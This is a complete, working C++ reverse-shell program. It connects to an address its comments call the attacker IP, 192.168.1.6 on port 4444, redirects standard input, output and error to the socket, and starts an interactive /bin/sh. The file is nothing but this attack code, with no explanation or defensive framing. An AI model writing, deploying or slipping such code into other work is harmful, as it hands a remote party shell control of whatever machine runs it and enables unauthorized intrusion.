#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>

int main() {
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);

    sockaddr_in addr{};
    addr.sin_family = AF_INET;
    addr.sin_port = htons(4444);           // Replace with attacker port
    inet_pton(AF_INET, "192.168.1.6", &addr.sin_addr);  // Replace with attacker IP

    connect(sockfd, (sockaddr*)&addr, sizeof(addr));

    // Redirect stdin, stdout, stderr to socket
    dup2(sockfd, 0);
    dup2(sockfd, 1);
    dup2(sockfd, 2);

    // Execute shell
    char * const args[] = { (char*)"/bin/sh", (char*)"-i", nullptr };
    execve("/bin/sh", args, nullptr);

    return 0;
}
